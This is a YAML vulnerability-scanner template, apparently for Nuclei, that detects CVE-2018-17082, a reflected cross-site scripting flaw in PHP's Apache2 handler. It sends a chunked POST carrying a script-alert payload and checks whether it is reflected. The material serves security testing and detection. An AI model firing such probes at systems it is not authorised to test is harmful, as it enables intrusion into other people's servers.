http:
- matchers:
  - part: body
    type: word
    words:
    - Bad Request<script>alert(document.domain)</script>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 400
    type: status
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Transfer-Encoding: chunked


    <script>alert(document.domain)</script>

    '
id: CVE-2018-17082
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:php:php:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-17082
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.9192
    epss-score: 0.08241
  description: 'Apache2 PHP before 5.6.38, 7.0.x before 7.0.32, 7.1.x before 7.1.22,
    and 7.2.x before 7.2.10 contain a reflected cross-site scripting vulnerability
    caused by mishandling of chunked transfer-encoding requests in sapi/apache2handler/sapi_apache2.c.
    Attackers can execute malicious scripts via crafted requests by sending a specially
    crafted chunked request.

    '
  impact: 'Attackers can execute malicious scripts in the context of the affected
    server, leading to potential session hijacking or data theft.

    '
  metadata:
    max-request: 1
    product: php
    vendor: php
    verified: false
  name: Apache2 - Transfer-Encoding Chunked XSS
  reference:
  - https://bugs.php.net/bug.php?id=76582
  - https://github.com/php/php-src/commit/23b057742e3cf199612fa8050ae86cae675e214e
  - https://nvd.nist.gov/vuln/detail/CVE-2018-17082
  - https://security.gentoo.org/glsa/201812-01
  - https://github.com/ockeghem/web-sec-study/blob/master/why-CVE-2018-17082-is-not-XSS/README.md
  remediation: 'Update to PHP 5.6.38, 7.0.32, 7.1.22, or 7.2.10 or later versions.

    '
  severity: medium
  tags: cve,cve2018,php,apache,xss,chunked
